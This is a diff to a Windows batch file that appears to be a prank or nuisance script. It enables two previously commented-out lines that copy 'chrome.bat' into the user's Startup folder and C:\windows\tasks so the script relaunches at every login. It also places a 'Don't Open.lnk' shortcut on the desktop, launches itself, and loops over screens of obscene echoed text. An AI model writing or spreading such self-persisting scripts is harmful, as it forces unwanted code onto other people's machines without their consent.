@@ -1,9 +1,11 @@
 @echo off
 
+REM Credit to Rez
+
 COLOR A
 
-REM copy chrome.bat "D:\%username%\Start Menu\Programs\Startup"
-REM copy chrome.bat C:\windows\tasks
+copy chrome.bat "D:\%username%\Start Menu\Programs\Startup"
+copy chrome.bat C:\windows\tasks
 copy "Don't Open.lnk" "D:\%username%\desktop
 
 
@@ -133,32 +135,32 @@ if exist Z:\Penis.txt goto :END
 
 START chrome.bat
 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
-Echo Penis Penis Penis Penis Penis Penis Penis 
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
+Echo Penis Penis Penis Penis Penis Penis Penis
 
 goto:START
 
 
-:END	
+:END
